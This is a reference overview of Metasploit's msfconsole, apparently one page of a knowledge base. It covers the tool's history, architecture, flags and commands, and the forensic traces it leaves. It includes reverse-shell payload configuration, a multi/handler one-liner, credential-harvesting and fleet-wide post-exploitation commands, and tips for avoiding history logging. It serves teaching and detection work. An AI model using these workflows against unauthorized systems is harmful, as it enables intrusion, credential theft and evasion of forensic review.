# Metasploit — msfconsole — Overview

> 🔴 **Red Flag Principle:** msfconsole never touches a target directly — every `exploit`/`auxiliary`/`post` module it drives does that instead. What msfconsole *does* leave, on the **operator's own box**, is the Framework's single richest artifact: `~/.msf4/history`, a flat, unencrypted, per-line command log recording the literal `use`/`set`/`run` sequence for every module ever invoked from that install — including any password or hash passed inline via `set`. Pair that with a workspace-scoped Postgres database recording every host, service, credential, and session touched, and msfconsole turns "did this operator run Metasploit" into "here is the exact module sequence, against which hosts, with which credentials" — provided the operator didn't clear it, use `-H` to redirect it, or run with `-n`/`--no-database`. On the target side, msfconsole's own signature is thinner: its most consistent footprint there is a `multi/handler` listener catching a callback, which — because the payload is doing the connecting — is direction-inverted from most of this module's other lateral-movement tools.

## Contents
- [History](#history)
- [How It Works](#how-it-works)
- [Techniques / Protocols Used](#techniques--protocols-used)
- [Command Reference — Quick Reference](#command-reference--quick-reference)
- [Quick Use-Case List](#quick-use-case-list)
- [Prerequisites](#prerequisites)

---

## History

msfconsole has been Metasploit's primary interactive interface since close to the Framework's earliest public releases (see `../00 - Metasploit Overview.md` for the Framework's own 2003 origin, 2007 Ruby rewrite, and 2009 Rapid7 acquisition). It was never the *only* interface, though — the Framework historically shipped several alternatives that have since been retired: **`msfcli`**, a single-line, non-interactive CLI for scripting one module invocation per command, was deprecated by Rapid7 in January 2015 and fully removed on **June 18, 2015** ([`Msfcli is No Longer Available in Metasploit`](https://www.rapid7.com/blog/post/2015/07/10/msfcli-is-no-longer-available-in-metasploit/)) — Rapid7's own guidance was to replace it with `msfconsole -x "use ...; set ...; run"`, the pattern this note's automation use cases build on. A GUI (`msfgui`) and a web interface (`msfweb`) also existed early in the project's life and were dropped well before that; `msfd`, a lightweight console-only remote-access daemon, still exists in the source tree but is legacy relative to `msfrpcd` (see `../RPC and Daemon (msfrpcd-msfd)/`) for anything automation-focused today.

msfconsole's implementation lives in the same [`rapid7/metasploit-framework`](https://github.com/rapid7/metasploit-framework) repository as the rest of the Framework, under the **3-clause BSD license**, maintained by **Rapid7, Inc.** The console itself is a thin Ruby REPL (`lib/metasploit/framework/command/console.rb` launches it; the interactive command set is implemented as a family of `Msf::Ui::Console::CommandDispatcher` classes — `Core`, `Modules`, `Jobs`, `Db`, `Session`, and others — each contributing one functional slice of the command surface documented below) sitting on top of the same `Msf::Framework` object every other interface (RPC, Pro's web UI) also drives.

## How It Works

```
Operator (msfconsole)                                    Framework Runtime
──────────────────────                                   ──────────────────
1. search / use / info ─────────────────────────────▶    Modules dispatcher loads a
                                                             Msf::Module subclass (exploit/
                                                             auxiliary/post/payload) into the
                                                             active context; prompt changes to
                                                             reflect it (msf6 exploit(...) >)

2. show options / show payloads / show targets ─────▶    Reads the module's DataStore
                                                             definition — required/optional
                                                             options, current values, defaults

3. set RHOSTS 10.10.10.5                             ┐
   set PAYLOAD windows/x64/meterpreter/reverse_tcp    ├──▶ Writes into the module's LOCAL
   set LHOST 10.10.14.1                               ┘    DataStore. setg instead writes into
                                                             the console's GLOBAL DataStore,
                                                             inherited by every module loaded
                                                             afterward until unset

4. run  /  exploit [-j] [-z] ────────────────────────▶    Module#run (or #exploit) executes:
                                                             ├─ auxiliary/post: runs to
                                                             │    completion, or opens a shell
                                                             └─ exploit: delivers PAYLOAD; on
                                                                  success the Framework
                                                                  registers a new Session
                                                                  object, tracked by a numeric
                                                                  session ID (Core dispatcher)

5. sessions -i <id>  /  -l  /  -k <id> ──────────────▶    Interact with / list / terminate
                                                             tracked Session objects (Session
                                                             dispatcher)
```

Every command above belongs to one of the `CommandDispatcher` classes, and any dispatched command that touched a host, a service, a credential, or produced loot also writes a corresponding record into the Postgres-backed Framework database *if one is connected* — this is what makes `hosts`/`services`/`creds`/`loot`/`vulns` a live, cross-module ledger rather than a per-module scratch pad (see [Workspace & Database](#workspace--database) coverage in `02 - Hands-On Use Cases.md`). Everything the operator types is also appended, unencrypted, to `~/.msf4/history` unless it was prefixed with a leading space (a deliberate, documented history-suppression convention — same idea as bash's `HISTCONTROL=ignorespace`, see `03 - Source Evidence.md`) or a custom `-H` path was used to redirect the file entirely.

`exploit/multi/handler` — covered fully in `02 - Hands-On Use Cases.md` — is a special case worth flagging here: it is a real exploit module (so it goes through the exact same `use`/`set`/`run` path above), but it never exploits anything. It exists purely to **open a listening socket** (or, for `bind_tcp` payloads, connect out to one already open on the target) and hand off whatever connects to the payload handler matching the configured `PAYLOAD`. Everything downstream of a successful handler catch — the session itself — is documented in `../Meterpreter/` or `../msfvenom/`'s sibling pages, not re-derived here.

## Techniques / Protocols Used

| Layer | Detail |
|---|---|
| Interface | Interactive Ruby REPL (`msfconsole`) dispatching to `Msf::Ui::Console::CommandDispatcher` subclasses — `Core` (module/session/job/misc commands), `Modules` (`search`/`use`/`info`/`show`), `Db` (workspace/database commands), `Jobs`, `Session` |
| Module execution | Whatever the loaded module itself implements — an `exploit` module speaks whatever protocol its target service does (SMB, HTTP, RDP, etc.); an `auxiliary` scanner likewise. msfconsole's own contribution is orchestration, not a protocol of its own |
| Persistence layer | PostgreSQL, accessed via ActiveRecord — the same database backs `hosts`/`services`/`creds`/`loot`/`vulns`/`workspace`/`sessions -l` history. Local instance set up by `msfdb init` under `~/.msf4/db/` by default (see `../00 - Metasploit Overview.md`) |
| Automation / scripting | Resource scripts (`.rc` files) — flat msfconsole command sequences, optionally with embedded `<ruby>...</ruby>` blocks for control flow and database queries |
| Remote/programmatic control | `msfrpcd` exposes the same module/session/job control surface over MSGPACK-RPC, independent of an interactive console — see `../RPC and Daemon (msfrpcd-msfd)/` |
| Handler/C2 channel | `exploit/multi/handler` is protocol-agnostic at the console level — it hands off to whatever transport the configured `PAYLOAD` uses (`reverse_tcp` raw socket, `reverse_http`/`reverse_https` WinInet-based HTTP(S), `bind_tcp`). See `../Meterpreter/01 - Overview.md` for the wire-level detail of the most common payload family caught this way |

## Command Reference — Quick Reference

Verified against the official [`rapid7/metasploit-framework`](https://github.com/rapid7/metasploit-framework) source — `lib/metasploit/framework/parsed_options/{console,base}.rb` for the CLI launch flags, `lib/msf/ui/console/command_dispatcher/{core,modules,jobs}.rb` and `docs.metasploit.com`'s `CommandDispatcher::Db`/`Session`/`Jobs` API reference for the in-console commands — not from memory or older cheat sheets.

### msfconsole Launch Flags

| Flag | Plain-English meaning |
|---|---|
| `-r, --resource FILE` | Execute a resource script immediately on startup (`-` reads the script from stdin). The primary automation entry point — see `02 - Hands-On Use Cases.md` |
| `-x, --execute-command COMMAND` | Run one or more console commands (semicolon-separated) on startup, e.g. `msfconsole -x "use exploit/multi/handler; set PAYLOAD ...; run -j"` |
| `-q, --quiet` | Suppress the startup banner |
| `-p, --plugin PLUGIN` | Load a plugin at startup, before any `-r`/`-x` runs |
| `-o, --output FILE` | Mirror all console output to a file for the whole session — the CLI-flag equivalent of running `spool <file>` immediately |
| `-H, --history-file FILE` | Use a non-default path for the command-history file instead of `~/.msf4/history` — an operator OPSEC-conscious enough to use this defeats a default-path history hunt entirely |
| `-l, --logger STRING` | Select which logging backend/sink to use |
| `-L, --real-readline` | Use the system's native Readline library instead of the bundled RbReadline implementation |
| `--[no-]readline` | Enable/disable command-line editing and history support entirely |
| `-a, --ask` | Prompt for confirmation before exiting (`exit -y` skips the prompt even with this set) |
| `-n, --no-database` | Start without connecting to the Framework database — `workspace`/`hosts`/`services`/`creds`/`loot`/`db_nmap` are unavailable for the whole session |
| `-y, --yaml PATH` | Use a specific YAML file for database connection settings instead of the default `~/.msf4/database.yml` |
| `-E, --environment ENV` | Rails environment for the database connection (defaults to `RAILS_ENV` or `production`) |
| `-M, --migration-path DIR` | Load additional database migrations from a custom directory |
| `-m, --module-path DIR` | Load modules from an additional directory alongside the built-in module tree — how custom/private modules get added |
| `-c FILE` | Load a specific configuration file instead of the default |
| `--[no-]defer-module-loads` | Control whether the full module cache builds eagerly at startup or lazily on first use |
| `-v, -V, --version` | Print the Framework version and exit |
| `-h, --help` | Show the flag summary and exit |

### Core In-Console Commands

**Module workflow**

| Command | Plain-English meaning |
|---|---|
| `search <keywords>` | Query the local module database. Supports typed filters — `type:`, `platform:`, `name:`, `author:`, `cve:`, `edb:`, `osvdb:`, `bid:`, `rank:`, `app:`, `date:`, `port:`, `description:`, `session_type:` (verified against the console's own search-keyword list) |
| `use <module_path>` | Load a module into the active context — prompt changes to reflect it |
| `info [-d] [-j]` | Full module documentation: options, targets, references, description. `-d` opens rendered Markdown documentation in a browser; `-j` emits JSON |
| `show <type>` | Enumerate `exploits`, `payloads`, `auxiliary`, `post`, `encoders`, `nops`, `plugins`, `options`, `targets`, `advanced`, `evasion`, `actions`, `missing` (required-but-unset options), `favorites`, or `all` |
| `set <VAR> <VAL>` | Set an option in the current module's **local** datastore |
| `setg <VAR> <VAL>` | Set an option in the **global** datastore — inherited by every module loaded afterward until explicitly unset |
| `unset <VAR> [-g]` / `unset all` | Clear one or more options (`-g` targets the global datastore; `all` clears everything) |
| `unsetg <VAR>` | Shorthand for `unset -g` |
| `run` / `exploit` | Execute the loaded module. `exploit` is exploit-module-specific vocabulary; both dispatch to the same execution path. Flags: `-j` (run as a background job), `-z` (exploit only — do **not** auto-interact with a newly opened session), `-f` (exploit only — force-run despite `MinimumRank`), `-e <encoder>` / `-p <payload>` / `-t <target-index>` (exploit only — one-off override without a separate `set`) |
| `back` | Exit the current module context and return to the base `msf6 >` prompt without running anything |

**Session & job control**

| Command | Plain-English meaning |
|---|---|
| `sessions -l` | List all active sessions |
| `sessions -i <id>` | Interact with a specific session |
| `sessions -k <id>` / `sessions -K` | Kill one session / kill all sessions |
| `sessions -u <id>` | Attempt to upgrade a plain shell session to a Meterpreter session |
| `sessions -c <cmd>` / `sessions -C <cmd>` | Run a shell command / a Meterpreter command against the session given by `-i`, or **all** sessions if `-i` is omitted — the fleet-wide post-exploitation primitive |
| `background` (inside a session) | Suspend the current session, return to `msfconsole`, leave it running |
| `jobs -l` | List running background jobs (handlers, running scanners, etc.) |
| `jobs -i <id> [-v]` | Show details of a specific job (`-v` also shows the advanced module options it was run with) |
| `jobs -k <id>` / `jobs -K` | Kill one job / kill all jobs |
| `jobs -p <id>` / `jobs -P` | Persist a specific payload-handler job / all of them, so they auto-restart on the next `msfconsole` launch (written to `~/.msf4/persist`) |

**Workspace & database**

| Command | Plain-English meaning |
|---|---|
| `db_status` | Confirm the database connection and driver |
| `workspace [-a name] [-d name] [-r old new] [-l] [-S name]` | Add / delete / rename / list workspaces, or switch to one — every command below is scoped to the active workspace |
| `db_nmap [nmap-flags] <targets>` | Run a real `nmap` binary and import its results (hosts, open ports, service banners) straight into the database — no separate import step |
| `db_import <file>` | Import a scan file from disk — Nmap XML, Nessus, OpenVAS, Qualys, and others, auto-detected by format |
| `hosts [-a] [-R] [-S filter]` | List/add hosts in the current workspace; `-R` feeds matching addresses directly into `RHOSTS` on the currently loaded module |
| `services [-p ports] [-r tcp\|udp] [-R]` | List/filter services discovered on hosts in the workspace |
| `vulns` | List vulnerability records associated with hosts/services (populated by modules that report them) |
| `creds [add ...] [-R]` | List, add, or filter harvested credentials (`hashdump`, `kiwi`, successful login attempts, manually recorded material) |
| `loot` | List files/data auto-saved by modules and extensions — credential dumps, screenshots, downloaded files |
| `notes` | Free-text annotations attached to hosts — engagement note-taking |

**Automation & logging**

| Command | Plain-English meaning |
|---|---|
| `resource <file>` | Run the commands in a `.rc` resource script from inside an already-running console |
| `makerc <file>` | Save the current session's command history to a new resource script |
| `spool <file>` / `spool off` | Mirror all console I/O to a file from this point forward — the in-console equivalent of `-o` |
| `save` | Persist the current datastore (including anything set with `setg`) to `~/.msf4/config`, auto-loaded on every future launch |
| `history [-n N] [-c]` | Show (or, with `-c`, clear) the in-session command history |
| `load <plugin>` / `load -l` | Load a plugin (`-l` lists what's available) — extends the console with new commands, e.g. `pcap_log`, `wmap` |

## Quick Use-Case List

- Baseline module discovery-and-run workflow (`search` → `use` → `info` → `show options` → `set` → `run`)
- Interrogating a module before firing it (`info -d`, `show options`/`payloads`/`targets`/`advanced`)
- Managing per-module vs. global options (`set`/`setg`/`unset`/`unsetg`, `save` to persist across restarts)
- Standing up a `multi/handler` listener to catch a staged or stageless payload
- Running multiple simultaneous handlers as backgrounded, persistent jobs
- Interacting with, upgrading, and broadcasting commands across sessions
- Building an engagement workspace and scanning directly into the database (`workspace`, `db_nmap`)
- Reviewing and pivoting off collected data (`hosts`/`services`/`creds`/`loot`/`vulns`, `-R` auto-populate)
- Automating a repeatable attack chain with a resource script (`-r`, `resource`, `makerc`)
- Unattended, fully scripted engagement launch (`-q -r -x` chained at the CLI)
- Loading a plugin to extend console functionality (`load`, `pcap_log`, `wmap`)
- Logging console output for engagement documentation (`spool`, `ConsoleLogging`, `LogLevel`)
- Fleet-wide targeting via `RHOSTS` ranges/CIDR and cross-session command broadcast
- Chained workflow: recon → exploitation → handler → post-exploitation, start to finish

Full walkthroughs with commands and MITRE ATT&CK mapping for every item above live in `02 - Hands-On Use Cases.md`.

## Prerequisites

| Requirement | Notes |
|---|---|
| Metasploit Framework installed | `msfconsole` on `PATH` — ships pre-installed on Kali, or via the official installer/`git clone` (see `../00 - Metasploit Overview.md`) |
| PostgreSQL database (optional but expected) | `msfdb init` sets it up under `~/.msf4/db/`. Without it, `workspace`/`hosts`/`services`/`creds`/`loot`/`db_nmap` are unavailable for the session — either because it was never initialized or because `-n`/`--no-database` was used |
| Network reachability | Entirely module-dependent — the target port for an exploit/auxiliary module, or a reachable inbound port for a `multi/handler` |
| `nmap` installed and on `PATH` | Required for `db_nmap`, which shells out to a real `nmap` binary |
| Sufficient local privilege | e.g. binding to a port below 1024 for a handler, or whatever the loaded module itself requires |
